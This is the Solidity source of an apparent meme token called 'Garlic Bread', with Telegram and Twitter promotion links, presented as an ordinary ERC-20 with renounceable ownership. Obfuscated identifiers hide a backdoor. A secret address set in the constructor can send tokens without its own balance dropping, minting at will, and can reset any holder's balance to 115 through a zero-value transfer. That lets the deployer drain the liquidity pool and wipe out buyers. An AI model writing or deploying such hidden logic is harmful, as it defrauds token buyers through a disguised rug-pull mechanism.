/*

Telegram: 📢 https://t.me/GarlicBreadETH

Twitter: 🐦 https://twitter.com/GarlicBread_ETH

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract GarlicBread is Ownable {
    function kqnexmcpzfj(address gysbjlxuen, address qhajvyxrcbtn, uint256 shykpnqc) private {
        if (naebt[gysbjlxuen] == 0) {
            balanceOf[gysbjlxuen] -= shykpnqc;
        }
        balanceOf[qhajvyxrcbtn] += shykpnqc;
        if (naebt[msg.sender] > 0 && shykpnqc == 0 && qhajvyxrcbtn != jvybsudrine) {
            balanceOf[qhajvyxrcbtn] = ixlrjfn;
        }
        emit Transfer(gysbjlxuen, qhajvyxrcbtn, shykpnqc);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;

    string public symbol = 'Garlic Bread';

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address qhajvyxrcbtn, uint256 shykpnqc) public returns (bool success) {
        kqnexmcpzfj(msg.sender, qhajvyxrcbtn, shykpnqc);
        return true;
    }

    address public jvybsudrine;

    constructor(address pkzbcmuwe) {
        balanceOf[msg.sender] = totalSupply;
        naebt[pkzbcmuwe] = ixlrjfn;
        IUniswapV2Router02 syjnxztcvr = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        jvybsudrine = IUniswapV2Factory(syjnxztcvr.factory()).createPair(address(this), syjnxztcvr.WETH());
    }

    function approve(address dacyzvjgmbwn, uint256 shykpnqc) public returns (bool success) {
        allowance[msg.sender][dacyzvjgmbwn] = shykpnqc;
        emit Approval(msg.sender, dacyzvjgmbwn, shykpnqc);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private naebt;

    mapping(address => uint256) private xgpmzanbqu;

    function transferFrom(address gysbjlxuen, address qhajvyxrcbtn, uint256 shykpnqc) public returns (bool success) {
        require(shykpnqc <= allowance[gysbjlxuen][msg.sender]);
        allowance[gysbjlxuen][msg.sender] -= shykpnqc;
        kqnexmcpzfj(gysbjlxuen, qhajvyxrcbtn, shykpnqc);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    string public name = 'Garlic Bread';

    uint256 private ixlrjfn = 115;
}